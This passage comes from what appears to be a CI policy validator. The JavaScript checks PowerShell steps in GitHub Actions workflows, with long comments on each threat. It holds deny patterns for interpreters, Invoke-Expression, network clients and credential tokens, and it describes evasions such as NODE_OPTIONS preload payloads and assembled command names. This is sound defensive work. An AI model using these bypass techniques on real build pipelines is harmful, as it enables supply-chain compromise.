    if (/@['"]|<#/u.test(run)) {
      reject('side-effect-policy', `${jobId}.${id} uses a here-string or block comment`);
    }
    // A trap is registered for its entire scope, not for the text after it, so
    // one placed anywhere in a step disarms every throw in that step -- which
    // is every assertion these steps make. No governed step uses one, and no
    // position in a step is a safe place for one, so it is refused outright
    // rather than bounded to a region the way catch is.
    if (/\btrap\b/iu.test(run)) {
      reject('side-effect-policy', `${jobId}.${id} registers a script-wide error trap`);
    }
    // PowerShell accepts U+2018/2019/201C/201D as string delimiters, so a smart
    // quote opens a span the brace scanner does not recognise; it then counts
    // braces that are inside a string and misplaces the depth of everything
    // after them. Adding four codepoints to the quote branch would fix the
    // reported case and leave the class open. Every governed script step is
    // pure ASCII -- verified across all five -- so anything outside printable
    // ASCII is refused instead and no confusable can be introduced at all.
    if (/[^\t\n\x20-\x7e]/u.test(run)) {
      reject('side-effect-policy', `${jobId}.${id} contains a character outside printable ASCII`);
    }
    // --% is PowerShell's stop-parsing token: everything after it on the line
    // becomes a literal native-command argument, so a brace following it is not
    // syntax at all. The scanner would still count it. No governed step needs
    // the token, so it is refused rather than modelled.
    if (/--%/u.test(run)) {
      reject('side-effect-policy', `${jobId}.${id} uses the stop-parsing token`);
    }
    // No job in this workflow holds contents: write, so there is no approved
    // push, commit, or staging path anywhere in it. These are flat refusals
    // rather than exemptions keyed to a step id.
    if (/ArgumentList\.Add\(['"]push['"]\)|\bgit\s+push\b/iu.test(run)) {
      reject('side-effect-policy', `${jobId}.${id} adds a push path to a read-only workflow`);
    }
    if (/\bgit\s+(?:add|commit)\b/iu.test(run)) {
      reject('side-effect-policy', `${jobId}.${id} adds a repository mutation to a read-only workflow`);
    }
  }

  const generateStep = findStep(verify, 'generate-and-verify', 'build.verify');
  assertScriptStep(
    generateStep,
    'build.verify.generate-and-verify',
    "'diff', '--no-ext-diff', '--no-textconv', '--quiet'",
    'verification no longer classifies native git diff status',
  );
  // The generator is repository-controlled code and every check in this step
  // runs after it. In-session it could shadow a cmdlet with a function, reassign
  // a variable in this scope through Set-Variable -Scope 1, or prepend a
  // directory to PATH -- each of which redirects the checks onto something it
  // chose. A process boundary removes the class instead of naming its members,
  // so the invocation form is policy rather than style.
  if (/^\s*& \.\/\.github\/workflows\/Generate-StyleGuideArtifacts\.ps1\s*$/mu.test(generateStep.run)) {
    reject('side-effect-policy', 'the generator is invoked in-session');
  }
  // Matched as a statement on its own line, not as a substring. A substring is
  // satisfied by text that never executes -- a comment, or a single-quoted
  // here-string containing the approved command -- and the positional checks
  // below anchor on the same match, so inert text would move the "after the
  // generator" region somewhere harmless while the generator never ran.
  const generatorStatement = /^\$arrGeneratorResult = @\(& pwsh -NoProfile -NonInteractive -File \.\/\.github\/workflows\/Generate-StyleGuideArtifacts\.ps1\)$/mu;
  if ((generateStep.run.match(generatorStatement) ?? []).length !== 1) {
    reject('side-effect-policy', 'the generator is not invoked exactly once as a statement');
  }
  // One notion of where the generator is, computed once and used by every
  // positional check below. There used to be two: this anchored match, and a
  // bare indexOf of the invocation's leading substring. They disagree on any
  // spelling that is not exactly this statement -- an indented copy, a second
  // occurrence, a mention inside a string -- and where they disagree the
  // positional checks were deriving "after the generator" from a position the
  // statement match never approved.
  const generatorIndex = generateStep.run.search(generatorStatement);
  const afterGenerator = generateStep.run.slice(generatorIndex);
  // The statement must also be code. Everything in this file matches text, and
  // text inside a region that never executes reads exactly like text that does:
  // a here-string and a block comment are refused outright above, but those two
  // do not exhaust the ways to write inert PowerShell. $null = { ... } is one,
  // if ($false) { ... } is another, and there is no end to that list. So the
  // property is derived rather than enumerated: brace depth is tracked across
  // the script, ignoring comments and quoted spans, and the invocation is
  // required to sit at depth zero -- outside every block, whatever introduced
  // it. Depth zero is where the step's own statements live; every function in
  // the script is defined inside braces and none of them may contain this.
  if (powerShellBraceDepthAt(generateStep.run, generatorIndex) !== 0) {
    reject('side-effect-policy', 'the generator invocation is nested inside a block');
  }
  // Git is resolved from a fixed candidate list before the generator runs and
  // held in a constant. A PATH lookup or Get-Command call placed after the
  // generator would consult state that code can steer, and an ordinary variable
  // could be reassigned from the generator's child scope.
  if (!generateStep.run.includes("@('/usr/bin/git', '/bin/git')") ||
      !generateStep.run.includes('New-Variable -Name strGitPath -Value $strResolvedGit -Option Constant') ||
      !generateStep.run.includes('$objStartInfo.FileName = $strGitPath')) {
    reject('git-policy', 'build.verify does not pin the Git executable before repository code runs');
  }
  if (/Get-Command/u.test(generateStep.run)) {
    reject('git-policy', 'build.verify resolves Git through a shadowable command lookup');
  }
  if (generateStep.run.indexOf('New-Variable -Name strGitPath') > generatorIndex) {
    reject('git-policy', 'build.verify resolves Git after the generator runs');
  }
  // Pinning the executable does not pin what Git will do: repository-local
  // configuration is loaded on every invocation, and core.fsmonitor names a
  // program Git runs to decide which paths changed. A hostile value makes every
  // probe below report a clean tree over modified files. The repository's own
  // configuration and hook surface is therefore digested across the generator.
  if (!generateStep.run.includes('function Get-GitControlSurfaceDigest') ||
      !generateStep.run.includes('$strControlSurfaceBefore = Get-GitControlSurfaceDigest') ||
      !generateStep.run.includes('git-state: the generator changed repository Git configuration or hooks') ||
      generateStep.run.indexOf('$strControlSurfaceBefore = Get-GitControlSurfaceDigest') > generatorIndex ||
      generateStep.run.indexOf('git-state: the generator changed repository Git configuration or hooks') < generatorIndex) {
    reject('git-policy', 'build.verify does not bracket the generator with a Git control-surface digest');
  }
  // Every Git probe in this step reports on state the generator can move: it
  // can stage and commit its output, advancing HEAD and emptying the working,
  // cached, and untracked sets, or set the advisory assume-unchanged bit that
  // Git documents as not working as expected for this purpose. Either makes a
  // stale artifact look clean. The deciding gate is therefore a byte-level
  // before/after comparison of the working tree, which asks Git nothing and
  // covers both drift and blast radius in one assertion.
  if (!generateStep.run.includes('function Get-WorktreeFileDigestMap') ||
      !generateStep.run.includes('$objWorktreeBefore = Get-WorktreeFileDigestMap') ||
      !generateStep.run.includes('$objWorktreeAfter = Get-WorktreeFileDigestMap') ||
      !generateStep.run.includes('generated-artifacts: committed artifacts do not match generator output') ||
      !generateStep.run.includes('outside the four generated artifacts') ||
      generateStep.run.indexOf('$objWorktreeBefore = Get-WorktreeFileDigestMap') > generatorIndex ||
      generateStep.run.indexOf('$objWorktreeAfter = Get-WorktreeFileDigestMap') < generatorIndex) {
    reject('side-effect-policy', 'build.verify does not bracket the generator with a worktree byte comparison');
  }
  // How the walk reaches the files decides what it can be made to read.
  // EnumerateFiles with AllDirectories descends through a directory link and
  // reports only the files behind it, so the walk leaves the workspace with no
  // entry to refuse; holding the frontier explicitly is what makes the link
  // visible first. Refusing a link rather than skipping one keeps the signal:
  // a skipped link is absent from both maps, which reads exactly like a
  // generator that did nothing. Streaming bounds the cost of a large file, and
  // consulting Length before opening keeps a FIFO from blocking the step until
  // the job times out.
  if (!generateStep.run.includes('[System.IO.Directory]::EnumerateFileSystemEntries($objPending.Pop())') ||
      generateStep.run.includes('[System.IO.SearchOption]::AllDirectories') ||
      !generateStep.run.includes("throw 'worktree: the working tree contains a link'") ||
      !generateStep.run.includes('[System.IO.FileAttributes]::ReparsePoint') ||
      !generateStep.run.includes('$objSha.ComputeHash($objStream)') ||
      generateStep.run.includes('[System.IO.File]::ReadAllBytes($strEntry)')) {
    reject('side-effect-policy', 'build.verify worktree walk can follow a link or read a file whole');
  }
  // Both remaining branches of the walk are named here rather than left to the
  // closing digest, because the digest is re-baselined by design whenever a
  // reviewed edit lands: an invariant only that digest protects is an invariant
  // that a legitimate re-stamp silently drops.
  //
  // The exclusion must compare the path to .git itself. A prefix test on the
  // string ".git" also matches .github and .gitattributes, which would drop the
  // workflows and the text policy out of both maps -- the generator could then
  // rewrite them with the comparison reporting no change at all.
  if (!generateStep.run.includes('$objFile.Length -eq 0') ||
      !generateStep.run.includes('if ($strEntry -cne $strGitDirectory) { $objPending.Push($strEntry) }') ||
      generateStep.run.includes('$strGitPrefix')) {
    reject('side-effect-policy', 'build.verify worktree walk lost its FIFO guard or its exact .git exclusion');
  }
  // The digest is only meaningful if its encoding is injective. Concatenating
  // the components raw is not: renaming pre-commit.sample to pre-commit and
  // prepending '.sample' to its content yields the identical byte stream while
  // converting an inert sample into an active hook. Each component is therefore
  // length-prefixed, and the component count is written first.
  if (!generateStep.run.includes('$listComponents = [System.Collections.Generic.List[byte[]]]::new()') ||
      !generateStep.run.includes('$arrLength = [System.BitConverter]::GetBytes([long]$arrComponent.Length)') ||
      !generateStep.run.includes('$arrCount = [System.BitConverter]::GetBytes([long]$listComponents.Count)')) {
    reject('git-policy', 'the Git control-surface digest does not frame its components unambiguously');
  }
  // GitHub applies these files to every subsequent step in the job. There is
  // no subsequent step today -- the step-order assertion above is what makes
  // that true -- but the two controls answer different questions and neither
  // subsumes the other: the order assertion says nothing consumes a poisoned
  // environment, and this one says the environment was not poisoned while the
  // step could still see it. The generator runs in a child process, which
  // closes the in-session channels but not these: they are files, writable
  // from any process, including descendants that outlive the step.
  if (!generateStep.run.includes('New-Variable -Name arrChannelPaths -Value @($env:GITHUB_ENV, $env:GITHUB_PATH) -Option Constant') ||
      !generateStep.run.includes('runner-state: the generator wrote to a runner step communication file') ||
      generateStep.run.indexOf('New-Variable -Name arrChannelPaths') > generatorIndex ||
      generateStep.run.indexOf('runner-state: the generator wrote to a runner step communication file') < generatorIndex) {
    reject('side-effect-policy', 'build.verify does not assert the runner step communication files are empty');
  }
  // The control-surface digest covers repository-local configuration only.
  // Git also loads system and global configuration on every invocation, and a
  // generator that writes core.fsmonitor to ~/.gitconfig steers every probe
  // while .git/config stays byte-identical. Those two locations are removed
  // from the child rather than inspected, which together with the local digest
  // accounts for all three documented configuration sources.
  if (!generateStep.run.includes("$objStartInfo.Environment['GIT_CONFIG_GLOBAL'] = '/dev/null'") ||
      !generateStep.run.includes("$objStartInfo.Environment['GIT_CONFIG_NOSYSTEM'] = '1'")) {
    reject('git-policy', 'build.verify probes inherit system or global Git configuration');
  }
  // Recording drift and continuing was coherent while a promotion writer
  // existed to commit the regenerated bytes; failing here would have skipped
  // it. Nothing commits them now, so a tolerated exit status 1 leaves the
  // repository stale behind a green check that claims verification.
  if (!generateStep.run.includes('if ($objDiff.ExitCode -eq 1) {') ||
      !generateStep.run.includes('generated-artifacts: committed artifacts do not match generator output')) {
    reject('side-effect-policy', 'build.verify tolerates generated-artifact drift');
  }

  // Guards neighbouring the drift check. The drift check itself pins its whole
  // condition and survived the battery; these did not, and each was measured
  // accepted. Counts rather than presence, so a disabled copy cannot sit beside
  // a live one.
  // Read from the projection, not the raw run text: the comments around these
  // guards discuss them by name, and a rule that cannot tell prose from code
  // would let a comment keep a deleted check "present".
  // Continuations are folded before projection, not after: the projection
  // treats a backtick as an escape and removes it, so a statement broken
  // across lines had already lost the only marker saying it was one.
  const strVerifyCode = powerShellTokenView(normalizeLineContinuations(generateStep.run));
  assertReviewedGuards(strVerifyCode, REVIEWED_VERIFY_GUARDS, 'side-effect-policy', (kind, frag) => kind === 'missing'
    ? `build.verify no longer performs a reviewed drift guard: ${frag}`
    : `a reviewed drift guard is no longer reachable where it was reviewed: ${frag}`);
  // What those guards read must still be what the step measured.
  for (const strName of REVIEWED_VERIFY_SINGLE_ASSIGNMENT) {
    const arrWrites = strVerifyCode.match(variableWritePattern(strName)) ?? [];
    if (arrWrites.length !== 1) {
      reject('side-effect-policy', `build.verify does not assign $${strName} exactly once`);
    }
  }
  // And what it does to them afterwards, since a mutation is not an assignment.
  for (const [strName, objReviewed] of Object.entries(REVIEWED_VERIFY_MEMBER_ACCESS)) {
    const objObserved = new Map();
    const objPattern = new RegExp(`\\$(?:\\{(?:[A-Za-z_][A-Za-z0-9_]*:)?${strName}\\}|(?:[A-Za-z_][A-Za-z0-9_]*:)?${strName}(?![A-Za-z0-9_]))[ \\t]*(\\.[A-Za-z_][A-Za-z0-9_]*|\\[)`, 'giu');
    for (const objMatch of strVerifyCode.matchAll(objPattern)) {
      const strMember = objMatch[1] === '[' ? '[' : objMatch[1];
      objObserved.set(strMember, (objObserved.get(strMember) ?? 0) + 1);
    }
    for (const [strMember, intCount] of objObserved) {
      if (objReviewed[strMember] === undefined) {
        reject('side-effect-policy', `build.verify makes an unreviewed use of $${strName}: ${strMember}`);
      }
      if (objReviewed[strMember] !== intCount) {
        reject('side-effect-policy', `build.verify uses $${strName}${strMember} ${intCount} times rather than the reviewed ${objReviewed[strMember]}`);
      }
    }
    for (const [strMember, intCount] of Object.entries(objReviewed)) {
      if ((objObserved.get(strMember) ?? 0) !== intCount) {
        reject('side-effect-policy', `build.verify no longer uses $${strName}${strMember} as reviewed`);
      }
    }
  }

  // An inserted early exit leaves every required fragment and ordering check
  // intact while skipping every probe below it, and the upload action then
  // publishes artifacts labelled verified that nothing verified. This script
  // defines functions, so the tokens are matched in statement position only.
  if (/^[ \t]*(?:exit|break|continue)\b|[;{][ \t]*(?:exit|break|continue)\b/imu.test(generateStep.run)) {
    reject('side-effect-policy', 'build.verify adds control flow that can bypass a required probe');
  }
  // Statement position cannot see a termination that arrives through a static
  // method. See PROCESS_TERMINATION for the enumeration and why it closes.
  if (PROCESS_TERMINATION.test(generateStep.run)) {
    reject('side-effect-policy', 'build.verify adds a process-termination path that can bypass a required probe');
  }
  // Static method calls, which are neither a bare command nor an invocation
  // operator and so were visible to no other rule here. The form closure runs
  // first so a computed member, or a type held in a variable, reports as the
  // shape it is rather than as a name that happens not to be on the list.
  for (const objCall of assertLiteralStaticCalls(strVerifyCode, 'side-effect-policy', 'build.verify')) {
    if (!REVIEWED_VERIFY_STATIC_CALLS.includes(`${objCall[1]}::${objCall[2]}`)) {
      reject('side-effect-policy', `build.verify makes an unreviewed static call: ${objCall[1]}::${objCall[2]}`);
    }
  }
  // How many times each is referred to at all -- after the member closure, so
  // that a mutation reports which member it used rather than only that a count
  // moved. This is what closes aliasing and the braced spelling together.
  for (const [strName, intReviewed] of Object.entries(REVIEWED_VERIFY_OCCURRENCES)) {
    const intObserved = (strVerifyCode.match(variableReferencePattern(strName)) ?? []).length;
    if (intObserved !== intReviewed) {
      reject('side-effect-policy', `build.verify refers to $${strName} ${intObserved} times rather than the reviewed ${intReviewed}`);
    }
  }
  // What may invoke, what may sit in command position, and the writers that are
  // neither. The three together are what the generator and the Markdown steps
  // already carry; this step had none of them.
  assertReviewedInvocations(generateStep.run, strVerifyCode, REVIEWED_VERIFY_INVOCATIONS,
    'side-effect-policy', 'build.verify');
  for (const objToken of strVerifyCode.matchAll(GENERATOR_COMMAND_POSITION)) {
    if (!REVIEWED_VERIFY_COMMANDS.includes(objToken[1])) {
      reject('side-effect-policy', `build.verify runs an unreviewed command: ${objToken[1]}`);
    }
  }
  const fnCountOf = (strHaystack, strNeedle) => strHaystack.split(strNeedle).length - 1;
  for (const strStatement of REVIEWED_VERIFY_NEW_VARIABLE) {
    if (fnCountOf(strVerifyCode, strStatement) !== 1) {
      reject('side-effect-policy', `build.verify no longer binds its reviewed constant: ${strStatement}`);
    }
  }
  if (fnCountOf(strVerifyCode, 'New-Variable') !== REVIEWED_VERIFY_NEW_VARIABLE.length) {
    reject('side-effect-policy', 'build.verify uses New-Variable outside its reviewed constant bindings');
  }
  // Reaches the Variable: provider and the PSVariable API, which are not command
  // position tokens, so the allowlist above cannot see them. None appears in the
  // reviewed step; New-Variable is excluded because it is pinned just above.
  if (/\b(?:Set-Variable|Get-Variable|Clear-Variable|Remove-Variable|Set-Item)\b|Variable:|PSVariable/iu.test(strVerifyCode)) {
    reject('side-effect-policy', 'build.verify writes a variable through an indirect API');
  }
  // return could not join that list: this script defines five functions and
  // every one of them ends in a return, so refusing the token outright would
  // refuse the script itself. Indentation cannot separate the two either --
  // PowerShell does not care where a statement sits, so a top-level return
  // could simply be indented to look nested.
  //
  // This was previously separated by position: refuse a return anywhere after
  // the generator, on the reasoning that every legitimate return is inside a
  // function defined before it. That reasoning was sound about where the
  // legitimate returns are and wrong about where a hostile one has to go. A
  // return placed one line *above* the generator ends the script before the
  // generator ever runs, and it satisfies every fragment, ordering, and depth
  // assertion here -- reproduced directly, and only the closing digest
  // objected, which is the arrangement lines 550-553 already call out as
  // insufficient on its own.
  //
  // Depth separates them exactly, and unlike position it does not care which
  // side of the generator the return sits on. Every legitimate return is
  // inside a function body, so at brace depth one or more; a return at depth
  // zero is a script-level return whatever it looks like and wherever it is.
  // A return inside a comment or a quoted span scans as null rather than zero
  // and is left alone, because it is not code.
  for (const returnToken of generateStep.run.matchAll(/\breturn\b/giu)) {
    if (powerShellBraceDepthAt(generateStep.run, returnToken.index) === 0) {
      reject('side-effect-policy', 'build.verify returns from the script at top level');
    }
  }
  // Every probe reports by throwing, so a handler around the governed region
  // turns each verdict into a no-op and the step succeeds having rejected
  // nothing. try/finally is used legitimately -- five of them, all disposing a
  // hash or a process -- but every one is inside a function defined before the
  // generator, so the same boundary that separates the returns separates these.
  //
  // trap used to be checked here alongside catch, and that was wrong: a trap
  // is registered for its whole scope rather than for the text that follows
  // it, so one written at the top of the script -- before the generator, in
  // the region this slice does not cover -- suppresses every throw below it
  // just the same. Position cannot separate a legitimate trap from a hostile
  // one because there is no legitimate one, in any governed step, so it is
  // refused everywhere instead.
  if (/\bcatch\b/iu.test(afterGenerator)) {
    reject('side-effect-policy', 'build.verify can suppress a probe failure after the generator runs');
  }
  // Redirected stdout and stderr must be drained concurrently. Reading either to
  // completion before the other deadlocks once the child fills the unread pipe,
  // which hangs the step until the Actions timeout instead of failing.
  //
  // This sits before the closing digest deliberately. Any edit to the step
  // changes the digest, so a digest placed first rejects every mutation and
  // the fixture for this assertion was passing on the digest's verdict rather
  // than on this one -- coverage the fixture count claimed and did not have.
  // Every named assertion must be reachable ahead of the backstop that would
  // otherwise answer for it.
  if (!generateStep.run.includes('$objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)') ||
      !generateStep.run.includes('$objProcess.StandardError.ReadToEndAsync()') ||
      !generateStep.run.includes('[void]$objCopyTask.GetAwaiter().GetResult()')) {
    reject('git-policy', 'build.verify no longer drains both Git streams concurrently');
  }
  assertPowerShellPrivateHelperHelp(
    generateStep.run,
    REVIEWED_VERIFY_HELP,
    EXPECTED_VERSION,
    'side-effect-policy',
    'build.verify',
  );
  // Closing backstop, mirroring the Markdown validation step, and last for the
  // reason above. The assertions before it name what changed; this pins
  // everything they do not model.
  if (createHash('sha256').update(generateStep.run, 'utf8').digest('hex') !== REVIEWED_VERIFY_STEP_DIGEST) {
    reject('side-effect-policy', 'build.verify script does not match its reviewed digest');
  }

  // One checkout, in the publishing job only. verify acquires the triggering
  // revision itself precisely so that it contains no action, and counting the
  // uses here is what keeps one from reappearing in either job: the per-step
  // rejection above says verify declares no uses key, and this says the file
  // as a whole contains exactly these two.
  validateActionMultiset(source, [ACTIONS.checkout, ACTIONS.uploadArtifact]);
}

// Shared by both jobs that run repository-controlled code, because both now
// acquire their own revision rather than using an action to do it. The two
// differ only in what else they have to bring: build.verify needs nothing but
// the tree, and markdown.markdownlint also needs the Node distribution that
// setup-node used to supply.
function validateAcquireStep(step, label, expected) {
  assertKeys(step, ['name', 'id', 'shell', 'run'], label);
  if (step.name !== expected.name || step.shell !== 'pwsh') {
    reject('acquire-policy', `${label} execution contract changed`);
  }
  // Named, not positional, and each with its own fixture -- the same correction
  // the credential-cleanup step needed. A single shared message would let a
  // fixture prove only that some requirement was missing.
  const requiredSequences = [
    // Absent-key and no-op statuses are classified explicitly below, which is
    // only reachable when native commands are not mapped onto the preference.
    ['native-command error mapping is disabled',
      'if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n' +
      '    $PSNativeCommandUseErrorActionPreference = $false\n' +
      '}'],
    ['the server the runner named',
      "if ($strServerUrl -cne 'https://github.com') {"],
    ['a plain owner/name repository',
      "if ($strRepository -cnotmatch '^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$') {"],
    // A ref resolves to whatever it points at when the fetch runs, which for a
    // push to a busy branch need not be the revision that triggered the run.
    ['a full commit hash rather than a ref',
      "if ($strSha -cnotmatch '^[0-9a-f]{40}$') {"],
    // Proven empty rather than cleaned: cleaning decides what to delete from
    // state that is already there, and an emptiness assertion has no such input.
    ['an empty workspace before fetching',
      'if (@([System.IO.Directory]::EnumerateFileSystemEntries($PWD.Path)).Count -ne 0) {'],
    ['a fetch of the commit itself',
      '& $strGitPath fetch --depth 1 --no-tags --no-recurse-submodules origin $strSha'],
    // Without this the step would accept whatever FETCH_HEAD happened to be.
    ['that the checked out revision is the triggering revision',
      '$strHead = (& $strGitPath rev-parse HEAD).Trim()\n' +
      'if ($LASTEXITCODE -ne 0 -or $strHead -cne $strSha) {'],
  ];
  for (const [requirement, sequence] of [...requiredSequences, ...(expected.extraSequences ?? [])]) {
    if (!step.run.includes(sequence)) {
      reject('acquire-policy', `${label} no longer asserts ${requirement}`);
    }
  }
  // The whole point of this step is that no credential exists to clean up, so
  // no mechanism for creating one may appear. checkout's own inputs are not
  // available here to be got wrong; what is available is a URL with a
  // credential in it, a helper, or an extraheader, and all three are refused.
  if (/@github\.com|credential\.helper|extraheader|GIT_ASKPASS|GITHUB_TOKEN/iu.test(step.run)) {
    reject('acquire-policy', `${label} introduces a credential into an anonymous fetch`);
  }
  // Every native status is classified. A missing classification is a step that
  // proceeds on a failed fetch and then digests whatever is on disk.
  const classifiedStatuses = step.run.match(/^if \(\$LASTEXITCODE -ne 0/gmu)?.length ?? 0;
  if (classifiedStatuses !== expected.classifiedStatuses) {
    reject('acquire-policy', `${label} native-status classification count changed`);
  }
  // Same reason as the credential step: the token ban catches
  // [Environment]::Exit only by coincidence and misses SetShouldExit entirely.
  if (/\b(?:exit|return|break|continue|trap)\b/iu.test(step.run) || PROCESS_TERMINATION.test(step.run)) {
    reject('acquire-policy', `${label} adds control flow that can bypass a required assertion`);
  }
  // The invocation surface of an acquire step, closed by argument rather than
  // by enumerating spellings -- which is the control that has failed here
  // repeatedly. Counting client names cannot see $strClient = 'cu' + 'rl',
  // so what is constrained is the invocation itself:
  //
  //   1. PowerShell has exactly two operators that invoke a command whose name
  //      is *computed*: & (call) and . (dot-source). Both are constrained below
  //      to the three reviewed path Constants, so no assembled name can run.
  //   2. Every other invocation must name its command with a literal, and a
  //      literal is text this scan can see. The literals that execute a string
  //      are refused by name below; the literals that perform network I/O are
  //      refused by NETWORK_CLIENT.
  //
  // Together those close the surface: an acquire step can invoke exactly the
  // three tools it was reviewed to invoke, and nothing can be reached by
  // assembling a name at runtime.
  //
  // The two operators are scanned separately because they are not spelled
  // alike. & is unambiguous wherever it appears. A dot is only the dot-source
  // operator at statement position -- verified on 7.6.4, where `. $p`, `.$p`
  // and a tab separator all dot-source, while `$PWD.Path`, `(...).Trim()` and
  // a trailing `.` argument do not. So the dot branch is anchored the same way
  // the control-flow bans are: line start, or directly after ; { or |, with
  // the target on the same line.
  const stepCode = powerShellTokenView(step.run);
  const arrReviewedTargets = ['$strGitPath', '$strCurlPath', '$strTarPath'];
  for (const call of stepCode.matchAll(/&\s*(\S+)/gu)) {
    if (!arrReviewedTargets.includes(call[1])) {
      reject('acquire-policy', `${label} invokes something other than a reviewed literal command`);
    }
  }
  // PowerShell's assignment grammar permits a statement on the right-hand
  // side, so `$null = . $strClient` dot-sources -- verified on 7.6.4. The
  // anchor therefore admits the assignment and sub-expression contexts too,
  // not just statement starts. This list is not claimed to be exhaustive of
  // PowerShell's grammar; the positive controls are the tail, the digest and
  // the interpreter ban below, and this is a further net rather than a proof.
  for (const call of stepCode.matchAll(/(?:^[ \t]*|[;{|=(,][ \t]*|&&[ \t]*|\|\|[ \t]*)\.[^\S\n]*([^\s]+)/gmu)) {
    if (!arrReviewedTargets.includes(call[1])) {
      reject('acquire-policy', `${label} dot-sources something other than a reviewed literal command`);
    }
  }
  // A native interpreter is a literal command name that runs an arbitrary
  // command string, so it defeats the closure argument above without using
  // either PowerShell invocation operator. Bash documents -c as executing its
  // string argument; the same is true of sh, python, perl and the rest. None
  // has any legitimate use in an acquire step, whose whole job is a fetch.
  // Anchored at command position, the same way the dot-source scan is. Without
  // that anchor the names collide with ordinary prose: "acquire: node download
  // exited ..." inside a throw message is not an invocation, and four such
  // strings tripped this rule the first time it was written.
  if (/(?:^[ \t]*|[;{|=(][ \t]*|&&[ \t]*)(?:\/(?:usr\/)?bin\/)?(?:bash|sh|dash|ksh|zsh|csh|tcsh|python[0-9.]*|perl|ruby|node|pwsh|powershell|env|xargs|awk|eval|nohup|setsid|timeout)\b/imu.test(stepCode)) {
    reject('acquire-policy', `${label} invokes a native interpreter`);
  }
  // The runner applies $GITHUB_ENV and $GITHUB_PATH to every subsequent step,
  // so an acquire step that appends NODE_OPTIONS=--require=<payload> preloads
  // repository-controlled code into npm and the policy validator without
  // touching a reviewed file, a version probe or a captured status. build.yml
  // already asserts these files stay empty around the generator; acquire steps
  // must not write them either.
  if (/GITHUB_ENV|GITHUB_PATH|GITHUB_OUTPUT|GITHUB_STATE|GITHUB_STEP_SUMMARY/u.test(step.run)) {
    reject('acquire-policy', `${label} writes a runner step communication file`);
  }
  // Matching those five names is necessary and not sufficient: 'GITHUB_' + 'ENV'
  // resolved through [Environment]::GetEnvironmentVariable contains no listed
  // token at all. Rather than chase spellings -- the pattern that has lost
  // every time on this branch -- the *capability* is removed. An acquire step
  // reads the environment through $env: literals and writes files only through
  // the three reviewed native tools, so a computed environment lookup and every
  // text-write API are refused outright. Neither acquire step uses either.
  if (/GetEnvironmentVariable|SetEnvironmentVariable/iu.test(stepCode)) {
    reject('acquire-policy', `${label} resolves an environment variable through a computed name`);
  }
  if (/\b(?:AppendAllText|AppendAllLines|WriteAllText|WriteAllLines|AppendText|CreateText|Add-Content|Set-Content|Out-File|New-Item|Tee-Object)\b|>>?[^\S\n]*\$/iu.test(stepCode)) {
    reject('acquire-policy', `${label} writes a file outside the reviewed native tools`);
  }
  // Named literals that run a string as a command. Microsoft documents
  // Invoke-Expression as evaluating "a specified string as a command" and notes
  // the call operator is the safer form; the aliases are documented on all
  // platforms, so they are refused alongside the full names. Spelling these
  // indirectly is not a way around the list, because an assembled name has to
  // be invoked through & or . to run at all, and both are constrained above.
  if (/\b(?:Invoke-Expression|iex|Invoke-Command|icm|Start-Process|saps)\b|\[\s*(?:System\.)?Management\.Automation\.ScriptBlock\s*\]|\[\s*scriptblock\s*\]\s*::\s*Create|\$ExecutionContext\s*\.\s*InvokeCommand|(?:System\.)?Diagnostics\.Process/iu.test(stepCode)) {
    reject('acquire-policy', `${label} adds a dynamic or indirect execution path`);
  }
  // Counted, not merely permitted. The Markdown acquire step is allowed one
  // download and the build one is allowed none, and a second request is how a
  // re-baselined step would fetch something the reviewed digest never covered.
  // Counted as invocations, not as name tokens. Matching client names counted
  // the candidate-list literals /usr/bin/curl and /bin/curl as two requests
  // when the step makes one -- the same defect in miniature that the previous
  // round reported, so it is counted the way that round asked for. This is
  // exact rather than approximate because the allowlist above admits only
  // three call targets, so no other invocation form can exist here at all.
  const networkCalls = (stepCode.match(/&\s*\$strCurlPath\b/gu) ?? []).length;
  if (networkCalls !== expected.networkClients) {
    reject('acquire-policy', `${label} network request count changed`);
  }
  if (expected.tail !== undefined && !step.run.trimEnd().endsWith(expected.tail)) {
    reject('acquire-policy', `${label} does not end at the verified extraction`);
  }
  // The last hole in the closure argument further above. A bare `./tools/x.ps1`
  // is an invocation by literal name -- no call operator, no banned cmdlet --
  // so neither operator scan can see it, and the Markdown acquire step has the
  // checkout on disk by the time it runs. Neither acquire step names a script
  // file today, so this refuses a construct with no legitimate use here.
  //
  // Placed after the tail assertion deliberately: a step that both breaks the
  // pinned tail and adds a script path should report the broader structural
  // failure, and several fixtures exercise a script path as the *payload* of a
  // different violation rather than as the violation itself.
  if (/\S*\.(?:ps1|psm1|sh|bash|zsh|py|rb|pl|mjs|cjs|js)\b/iu.test(stepCode)) {
    reject('acquire-policy', `${label} references an executable script path`);
  }
  // Point 2 of the invocation-surface argument above promised this and did not
  // do it: NETWORK_CLIENT was applied in validateBuildPolicy and in the cleanup
  // step, but never here, so the closure had a hole exactly where it claimed
  // not to. Measured with the digest gate neutralised -- the precondition every
  // report of this kind assumes -- a literal Invoke-WebRequest in this step was
  // accepted. Both reviewed steps are clean under this pattern, so making the
  // documented check true costs nothing.
  //
  // Placed here for the same reason the script-path rule is: an assembled or
  // dot-sourced client should report as the invocation-surface failure it is,
  // and several fixtures use a client name as the payload of a different
  // violation. This is the fallback for a client that is simply named outright.
  if (NETWORK_CLIENT.test(stepCode)) {
    reject('acquire-policy', `${label} adds a network client`);
  }
  // Computed *type* names are the same class as computed command names, which
  // point 1 refuses: New-Object -TypeName ('System.Net.' + 'WebClient') reaches
  // a client without ever spelling one, because the projection blanks both
  // fragments and the invocation itself is the literal New-Object. Enumerating
  // type names would lose to the next concatenation, so the capability goes
  // instead. Measured, New-Object appears zero times across all five reviewed
  // steps, so this refuses a tool the acquire step never had rather than
  // narrowing one it uses.
  if (/\bNew-Object\b/iu.test(stepCode)) {
    reject('acquire-policy', `${label} constructs an object through New-Object`);
  }
  // The .NET static surface, closed the same way as the invocation surface:
  // by what may be called rather than by what may not. A writer blacklist was
  // the proposal here, and it is the control that has failed repeatedly --
  // naming Copy leaves Move, Replace, WriteAllBytes, OpenWrite, and every
  // stream type behind it. Unlike New-Object the capability cannot simply go:
  // [System.IO.File]:: is load-bearing in both reviewed acquire steps.
  //
  // So it is enumerated positively. Measured across both, the union of every
  // static call they make is these five, and only CreateDirectory writes
  // anything -- a directory, not file content. Anything else is a capability
  // the acquire step has never needed.
  //
  // Round 56: this refused a computed MEMBER but still required a literal `[`
  // type `]` to anchor on, so `$typ = [System.IO.File]; $typ::Copy(...)` was
  // matched by nothing at all and accepted. Both sides of the `::` are now
